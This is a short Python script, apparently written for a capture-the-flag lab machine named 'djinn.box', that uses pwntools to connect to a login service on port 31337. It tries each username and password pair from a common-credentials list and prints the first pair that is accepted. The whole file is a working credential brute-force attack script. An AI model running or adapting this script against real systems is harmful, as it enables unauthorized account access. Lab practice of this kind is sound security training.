#!/usr/bin/env python3

from pwn import *
import sys

host, port = 'djinn.box', 31337

# https://raw.githubusercontent.com/shipcod3/Piata-Common-Usernames-and-Passwords/master/userpass.txt

with open('userpass.txt') as f:
	data = f.readlines()

for creds in data:
	(username, password) = creds.split(' ')
	username = username.strip()
	password = password.strip()

	s = remote(host, port, level='error')
	
	s.recvuntil('username> ')
	s.sendline(username)
	s.recvuntil('password> ')
	s.sendline(password)

	msg = s.recvline()
	if b'authentication failed' not in msg:
		print("[+] Valid credentials found: {}:{}".format(username, password))
		sys.exit(0)

	s.close()
